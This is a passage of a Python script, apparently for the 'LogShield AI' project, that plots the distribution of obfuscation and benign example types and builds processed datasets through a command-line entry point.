    top_obf = df["obfuscation_type"].value_counts().head(14)
    ax = top_obf.sort_values().plot(kind="barh", figsize=(9, 6), color="#72B7B2")
    ax.set_title("Top Obfuscation and Benign Example Types")
    ax.set_xlabel("Rows")
    plt.tight_layout()
    plt.savefig(PLOTS_DIR / "obfuscation_type_distribution.png", dpi=160)
    plt.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Build LogShield AI processed datasets")
    parser.add_argument("--samples-per-family", type=int, default=12)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument("--no-fetch-external", action="store_true", help="Use deterministic fallback external examples")
    args = parser.parse_args()
    df = build_dataset(samples_per_family=args.samples_per_family, seed=args.seed, fetch_external=not args.no_fetch_external)
    print(f"[+] Built dataset with {len(df)} rows in {PROCESSED_DATA_DIR}")


if __name__ == "__main__":
    main()
